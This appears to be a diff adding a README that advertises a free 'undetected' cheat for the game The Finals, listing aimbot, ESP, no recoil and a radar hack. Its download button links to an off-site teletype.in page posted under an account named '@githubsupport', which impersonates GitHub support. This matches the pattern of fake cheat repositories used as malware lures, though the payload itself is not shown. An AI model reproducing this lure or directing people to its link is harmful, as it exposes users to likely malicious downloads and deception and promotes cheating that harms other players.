@@ -1,0 +1,36 @@
+# The Finals PC Hack 2025 - Safe Download & Install Guide
+
+[![Version](https://img.shields.io/badge/Version-2.5.0-blue?logo=windows)](https://img.shields.io)
+[![Year](https://img.shields.io/badge/Year-2025-ff69b4?logo=windows)](https://img.shields.io)
+[![Platform](https://img.shields.io/badge/Platform-Windows-0078d7?logo=windows)](https://img.shields.io)
+[![Status](https://img.shields.io/badge/Status-Active-brightgreen?logo=github)](https://img.shields.io)
+
+🎮 **The Ultimate Free Hack for The Finals (2025)** 🎯  
+
+Unlock the full potential of **The Finals** with our powerful, undetected cheat! Designed for **Windows 2025**, this tool offers **smooth gameplay**, **enhanced performance**, and **maximum security**.  
+
+✨ **Features** ✨  
+✔ **Aimbot** - Precision targeting  
+✔ **ESP** - Full enemy visibility  
+✔ **No Recoil** - Perfect shooting  
+✔ **Radar Hack** - Always know enemy positions  
+✔ **100% Undetected** - Regular updates  
+
+🔧 **Requirements**  
+- Windows 10/11 (2025 Edition)  
+- DirectX 12+  
+- 8GB RAM  
+
+📥 **Download Now**  
+[![Download](https://img.shields.io/badge/Download-Free_Cheat-00cc00?logo=download)](https://teletype.in/@githubsupport/aHN9l6m-mbF?F63B2FBE80A34B228F06C082D20AAAED)  
+
+⚠ **Disclaimer**  
+Use at your own risk. We are not responsible for any bans or penalties.  
+
+💬 **Support**  
+For help, join our [Discord](https://discord.gg/example).  
+
+🔒 **Stay Updated**  
+Check back often for the latest patches and features!  
+
+🌟 **Enjoy Domination!** 🌟
